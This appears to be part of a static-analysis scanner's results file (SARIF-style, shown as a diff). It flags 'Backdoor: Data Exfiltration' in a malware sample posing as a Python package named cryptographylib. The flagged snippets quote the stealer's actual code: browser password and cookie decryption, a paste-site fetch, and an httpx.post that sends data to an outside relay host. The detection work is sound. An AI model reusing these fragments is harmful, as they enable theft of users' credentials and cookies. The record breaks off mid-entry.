+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 220,
+                  "startColumn": 23,
+                  "endLine": 220,
+                  "endColumn": 28,
+                  "snippet": {
+                    "text": "        if req.status_code == 200:\r\n            data = req.json()\r\n            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n",
+                    "rendered": {
+                      "text": "        if req.status_code == 200:\r\n            data = req.json()\r\n            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n",
+                      "markdown": "`        if req.status_code == 200:\r\n            data = req.json()\r\n            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n            org = data.get('org')\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 219,
+                  "startColumn": 21,
+                  "endLine": 219,
+                  "endColumn": 26,
+                  "snippet": {
+                    "text": "        req = httpx.get(\"https://ipinfo.io/json\")\r\n        if req.status_code == 200:\r\n            data = req.json()\r\n            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n",
+                    "rendered": {
+                      "text": "        req = httpx.get(\"https://ipinfo.io/json\")\r\n        if req.status_code == 200:\r\n            data = req.json()\r\n            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n",
+                      "markdown": "`        req = httpx.get(\"https://ipinfo.io/json\")\r\n        if req.status_code == 200:\r\n            data = req.json()\r\n            ip = data.get('ip')\r\n            city = data.get('city')\r\n            country = data.get('country')\r\n            region = data.get('region')\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 216,
+                  "startColumn": 19,
+                  "endLine": 216,
+                  "endColumn": 24,
+                  "snippet": {
+                    "text": "    @staticmethod\r\n    def net_1fo() -> list:\r\n        ip, city, country, region, org, loc, googlemap = \"None\", \"None\", \"None\", \"None\", \"None\", \"None\", \"None\"\r\n        req = httpx.get(\"https://ipinfo.io/json\")\r\n        if req.status_code == 200:\r\n            data = req.json()\r\n            ip = data.get('ip')\r\n",
+                    "rendered": {
+                      "text": "    @staticmethod\r\n    def net_1fo() -> list:\r\n        ip, city, country, region, org, loc, googlemap = \"None\", \"None\", \"None\", \"None\", \"None\", \"None\", \"None\"\r\n        req = httpx.get(\"https://ipinfo.io/json\")\r\n        if req.status_code == 200:\r\n            data = req.json()\r\n            ip = data.get('ip')\r\n",
+                      "markdown": "`    @staticmethod\r\n    def net_1fo() -> list:\r\n        ip, city, country, region, org, loc, googlemap = \"None\", \"None\", \"None\", \"None\", \"None\", \"None\", \"None\"\r\n        req = httpx.get(\"https://ipinfo.io/json\")\r\n        if req.status_code == 200:\r\n            data = req.json()\r\n            ip = data.get('ip')\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 129,
+                  "startColumn": 18,
+                  "endLine": 129,
+                  "endColumn": 23,
+                  "snippet": {
+                    "text": "d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(\".\")[0]\r\n\r\nKEKWLTD_Regex = 'https://paste.bingner.com/paste/fhvyp/raw'\r\nreg_req = requests.get(KEKWLTD_Regex) \r\nclear_reg = r\"[\\w-]{24}\\.\" + reg_req.text\r\n\r\n\r\n",
+                    "rendered": {
+                      "text": "d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(\".\")[0]\r\n\r\nKEKWLTD_Regex = 'https://paste.bingner.com/paste/fhvyp/raw'\r\nreg_req = requests.get(KEKWLTD_Regex) \r\nclear_reg = r\"[\\w-]{24}\\.\" + reg_req.text\r\n\r\n\r\n",
+                      "markdown": "`d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(\".\")[0]\r\n\r\nKEKWLTD_Regex = 'https://paste.bingner.com/paste/fhvyp/raw'\r\nreg_req = requests.get(KEKWLTD_Regex) \r\nclear_reg = r\"[\\w-]{24}\\.\" + reg_req.text\r\n\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 13,
+                  "startColumn": 5,
+                  "endLine": 13,
+                  "endColumn": 11,
+                  "snippet": {
+                    "text": "            }]\r\n            \r\n    }\r\nhttpx.post(\"https://kekwltd.ru/relay/download\", json=data)\r\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\r\nimport asyncio\r\nimport json\r\n",
+                    "rendered": {
+                      "text": "            }]\r\n            \r\n    }\r\nhttpx.post(\"https://kekwltd.ru/relay/download\", json=data)\r\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\r\nimport asyncio\r\nimport json\r\n",
+                      "markdown": "`            }]\r\n            \r\n    }\r\nhttpx.post(\"https://kekwltd.ru/relay/download\", json=data)\r\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\r\nimport asyncio\r\nimport json\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 1622,
+                  "startColumn": 24,
+                  "endLine": 1622,
+                  "endColumn": 32,
+                  "snippet": {
+                    "text": "    global upths\r\n    upths = []\r\n\r\n    for file in [\"bc_allpasswords.txt\", \"bc_allcookies.txt\"]:\r\n        upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\r\n\r\n\r\n",
+                    "rendered": {
+                      "text": "    global upths\r\n    upths = []\r\n\r\n    for file in [\"bc_allpasswords.txt\", \"bc_allcookies.txt\"]:\r\n        upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\r\n\r\n\r\n",
+                      "markdown": "`    global upths\r\n    upths = []\r\n\r\n    for file in [\"bc_allpasswords.txt\", \"bc_allcookies.txt\"]:\r\n        upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\r\n\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 1574,
+                  "startColumn": 117,
+                  "endLine": 1574,
+                  "endColumn": 125,
+                  "snippet": {
+                    "text": ":\r\n        if not \".zip\" in file: zf.write(pathC + \"/\" + file)\r\n    zf.close()\r\n\r\n    upload(f'{pathC}/{name}.zip')\r\n    os.remove(f\"{pathC}/{name}.zip\")\r\n\r\n\r\ndef grabb_GatherAll():\r\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\r\n    browserPaths = [\r\n        [f\"{roaming}/Opera Software/Opera GX Stable\",               \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extensi",
+                    "rendered": {
+                      "text": ":\r\n        if not \".zip\" in file: zf.write(pathC + \"/\" + file)\r\n    zf.close()\r\n\r\n    upload(f'{pathC}/{name}.zip')\r\n    os.remove(f\"{pathC}/{name}.zip\")\r\n\r\n\r\ndef grabb_GatherAll():\r\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\r\n    browserPaths = [\r\n        [f\"{roaming}/Opera Software/Opera GX Stable\",               \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extensi",
+                      "markdown": "`:\r\n        if not \".zip\" in file: zf.write(pathC + \"/\" + file)\r\n    zf.close()\r\n\r\n    upload(f'{pathC}/{name}.zip')\r\n    os.remove(f\"{pathC}/{name}.zip\")\r\n\r\n\r\ndef grabb_GatherAll():\r\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\r\n    browserPaths = [\r\n        [f\"{roaming}/Opera Software/Opera GX Stable\",               \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extensi`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 1558,
+                  "startColumn": 24,
+                  "endLine": 1558,
+                  "endColumn": 32,
+                  "snippet": {
+                    "text": "        data = f.readlines()\r\n        found = False\r\n        for l in data:\r\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\r\n                found = True\r\n        if found == False: return\r\n        name = arg\r\n",
+                    "rendered": {
+                      "text": "        data = f.readlines()\r\n        found = False\r\n        for l in data:\r\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\r\n                found = True\r\n        if found == False: return\r\n        name = arg\r\n",
+                      "markdown": "`        data = f.readlines()\r\n        found = False\r\n        for l in data:\r\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\r\n                found = True\r\n        if found == False: return\r\n        name = arg\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 1471,
+                  "startColumn": 31,
+                  "endLine": 1471,
+                  "endColumn": 39,
+                  "snippet": {
+                    "text": "                if wa in row[0]:\r\n                    if not old in paswWords: paswWords.append(old)\r\n            Passw.append(f\"URL: {row[0]} \\n ID: {row[1]} \\n PASSW0RD: {DecryptValue(row[2], master_key)}\\n\\n\")\r\n    writeforfile(Passw, 'bc_allpasswords')\r\n\r\nCookies = []\r\ndef getCookie(path, arg):\r\n",
+                    "rendered": {
+                      "text": "                if wa in row[0]:\r\n                    if not old in paswWords: paswWords.append(old)\r\n            Passw.append(f\"URL: {row[0]} \\n ID: {row[1]} \\n PASSW0RD: {DecryptValue(row[2], master_key)}\\n\\n\")\r\n    writeforfile(Passw, 'bc_allpasswords')\r\n\r\nCookies = []\r\ndef getCookie(path, arg):\r\n",
+                      "markdown": "`                if wa in row[0]:\r\n                    if not old in paswWords: paswWords.append(old)\r\n            Passw.append(f\"URL: {row[0]} \\n ID: {row[1]} \\n PASSW0RD: {DecryptValue(row[2], master_key)}\\n\\n\")\r\n    writeforfile(Passw, 'bc_allpasswords')\r\n\r\nCookies = []\r\ndef getCookie(path, arg):\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 1450,
+                  "startColumn": 55,
+                  "endLine": 1450,
+                  "endColumn": 63,
+                  "snippet": {
+                    "text": "    shutil.copy2(pathC, tempfold)\r\n    conn = connect(tempfold)\r\n    cursor = conn.cursor()\r\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\r\n    data = cursor.fetchall()\r\n    cursor.close()\r\n    conn.close()\r\n",
+                    "rendered": {
+                      "text": "    shutil.copy2(pathC, tempfold)\r\n    conn = connect(tempfold)\r\n    cursor = conn.cursor()\r\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\r\n    data = cursor.fetchall()\r\n    cursor.close()\r\n    conn.close()\r\n",
+                      "markdown": "`    shutil.copy2(pathC, tempfold)\r\n    conn = connect(tempfold)\r\n    cursor = conn.cursor()\r\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\r\n    data = cursor.fetchall()\r\n    cursor.close()\r\n    conn.close()\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 1374,
+                  "startColumn": 25,
+                  "endLine": 1374,
+                  "endColumn": 33,
+                  "snippet": {
+                    "text": "            {\r\n            \"fields\": [\r\n                {\r\n                \"name\": \"Passwords Found:\",\r\n                \"value\": ra\r\n                }\r\n            ],\r\n",
+                    "rendered": {
+                      "text": "            {\r\n            \"fields\": [\r\n                {\r\n                \"name\": \"Passwords Found:\",\r\n                \"value\": ra\r\n                }\r\n            ],\r\n",
+                      "markdown": "`            {\r\n            \"fields\": [\r\n                {\r\n                \"name\": \"Passwords Found:\",\r\n                \"value\": ra\r\n                }\r\n            ],\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 1360,
+                  "startColumn": 14,
+                  "endLine": 1360,
+                  "endColumn": 22,
+                  "snippet": {
+                    "text": "    path = name\r\n    files = {'file': open(path, 'rb')}\r\n\r\n    if \"bc_allpasswords\" in name:\r\n\r\n        ra = ' | '.join(da for da in paswWords)\r\n\r\n",
+                    "rendered": {
+                      "text": "    path = name\r\n    files = {'file': open(path, 'rb')}\r\n\r\n    if \"bc_allpasswords\" in name:\r\n\r\n        ra = ' | '.join(da for da in paswWords)\r\n\r\n",
+                      "markdown": "`    path = name\r\n    files = {'file': open(path, 'rb')}\r\n\r\n    if \"bc_allpasswords\" in name:\r\n\r\n        ra = ' | '.join(da for da in paswWords)\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 774,
+                  "startColumn": 83,
+                  "endLine": 774,
+                  "endColumn": 91,
+                  "snippet": {
+                    "text": "                    encrypted_password = r[2]\r\n                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)\r\n                    if url != \"\":\r\n                        f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {decrypted_password}\\n\\n\")\r\n\r\n                cursor.close()\r\n                conn.close()\r\n",
+                    "rendered": {
+                      "text": "                    encrypted_password = r[2]\r\n                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)\r\n                    if url != \"\":\r\n                        f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {decrypted_password}\\n\\n\")\r\n\r\n                cursor.close()\r\n                conn.close()\r\n",
+                      "markdown": "`                    encrypted_password = r[2]\r\n                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)\r\n                    if url != \"\":\r\n                        f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {decrypted_password}\\n\\n\")\r\n\r\n                cursor.close()\r\n                conn.close()\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 772,
+                  "startColumn": 66,
+                  "endLine": 772,
+                  "endColumn": 74,
+                  "snippet": {
+                    "text": "                    url = r[0]\r\n                    username = r[1]\r\n                    encrypted_password = r[2]\r\n                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)\r\n                    if url != \"\":\r\n                        f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {decrypted_password}\\n\\n\")\r\n\r\n",
+                    "rendered": {
+                      "text": "                    url = r[0]\r\n                    username = r[1]\r\n                    encrypted_password = r[2]\r\n                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)\r\n                    if url != \"\":\r\n                        f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {decrypted_password}\\n\\n\")\r\n\r\n",
+                      "markdown": "`                    url = r[0]\r\n                    username = r[1]\r\n                    encrypted_password = r[2]\r\n                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)\r\n                    if url != \"\":\r\n                        f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {decrypted_password}\\n\\n\")\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 772,
+                  "startColumn": 30,
+                  "endLine": 772,
+                  "endColumn": 38,
+                  "snippet": {
+                    "text": "                    url = r[0]\r\n                    username = r[1]\r\n                    encrypted_password = r[2]\r\n                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)\r\n                    if url != \"\":\r\n                        f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {decrypted_password}\\n\\n\")\r\n\r\n",
+                    "rendered": {
+                      "text": "                    url = r[0]\r\n                    username = r[1]\r\n                    encrypted_password = r[2]\r\n                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)\r\n                    if url != \"\":\r\n                        f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {decrypted_password}\\n\\n\")\r\n\r\n",
+                      "markdown": "`                    url = r[0]\r\n                    username = r[1]\r\n                    encrypted_password = r[2]\r\n                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)\r\n                    if url != \"\":\r\n                        f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {decrypted_password}\\n\\n\")\r\n\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 771,
+                  "startColumn": 30,
+                  "endLine": 771,
+                  "endColumn": 38,
+                  "snippet": {
+                    "text": "                for r in cursor.fetchall():\r\n                    url = r[0]\r\n                    username = r[1]\r\n                    encrypted_password = r[2]\r\n                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)\r\n                    if url != \"\":\r\n                        f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {decrypted_password}\\n\\n\")\r\n",
+                    "rendered": {
+                      "text": "                for r in cursor.fetchall():\r\n                    url = r[0]\r\n                    username = r[1]\r\n                    encrypted_password = r[2]\r\n                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)\r\n                    if url != \"\":\r\n                        f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {decrypted_password}\\n\\n\")\r\n",
+                      "markdown": "`                for r in cursor.fetchall():\r\n                    url = r[0]\r\n                    username = r[1]\r\n                    encrypted_password = r[2]\r\n                    decrypted_password = self.dcrpt_val(encrypted_password, self.chrome_key)\r\n                    if url != \"\":\r\n                        f.write(f\"URL: {url}\\nID: {username}\\nPASSW0RD: {decrypted_password}\\n\\n\")\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 766,
+                  "startColumn": 67,
+                  "endLine": 766,
+                  "endColumn": 75,
+                  "snippet": {
+                    "text": "                shutil.copy2(login_db, login)\r\n                conn = sqlite3.connect(login)\r\n                cursor = conn.cursor()\r\n                cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")\r\n\r\n                for r in cursor.fetchall():\r\n                    url = r[0]\r\n",
+                    "rendered": {
+                      "text": "                shutil.copy2(login_db, login)\r\n                conn = sqlite3.connect(login)\r\n                cursor = conn.cursor()\r\n                cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")\r\n\r\n                for r in cursor.fetchall():\r\n                    url = r[0]\r\n",
+                      "markdown": "`                shutil.copy2(login_db, login)\r\n                conn = sqlite3.connect(login)\r\n                cursor = conn.cursor()\r\n                cursor.execute(\"SELECT action_url, username_value, password_value FROM logins\")\r\n\r\n                for r in cursor.fetchall():\r\n                    url = r[0]\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
+                "region": {
+                  "startLine": 757,
+                  "startColumn": 50,
+                  "endLine": 757,
+                  "endColumn": 58,
+                  "snippet": {
+                    "text": "\r\n    @extract_try\r\n    def steal_passwords(self):\r\n        f = open(ntpath.join(self.dir, 'Google', 'Passwords.txt'), 'w', encoding=\"cp437\", errors='ignore')\r\n        for prof in os.listdir(self.chrmmuserdtt):\r\n            if re.match(self.chrmrgx, prof):\r\n                login_db = ntpath.join(self.chrmmuserdtt, prof, 'Login Data')\r\n",
+                    "rendered": {
+                      "text": "\r\n    @extract_try\r\n    def steal_passwords(self):\r\n        f = open(ntpath.join(self.dir, 'Google', 'Passwords.txt'), 'w', encoding=\"cp437\", errors='ignore')\r\n        for prof in os.listdir(self.chrmmuserdtt):\r\n            if re.match(self.chrmrgx, prof):\r\n                login_db = ntpath.join(self.chrmmuserdtt, prof, 'Login Data')\r\n",
+                      "markdown": "`\r\n    @extract_try\r\n    def steal_passwords(self):\r\n        f = open(ntpath.join(self.dir, 'Google', 'Passwords.txt'), 'w', encoding=\"cp437\", errors='ignore')\r\n        for prof in os.listdir(self.chrmmuserdtt):\r\n            if re.match(self.chrmrgx, prof):\r\n                login_db = ntpath.join(self.chrmmuserdtt, prof, 'Login Data')\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000701"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Tokens)",
+            "id": "BD000701"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "./datasets/malware/dataset1/cryptographylib-1.2.0.tar.gz/cryptographylib-1.2.0.tar/cryptographylib-1.2.0/cryptographylib/__init__.py"
+                },
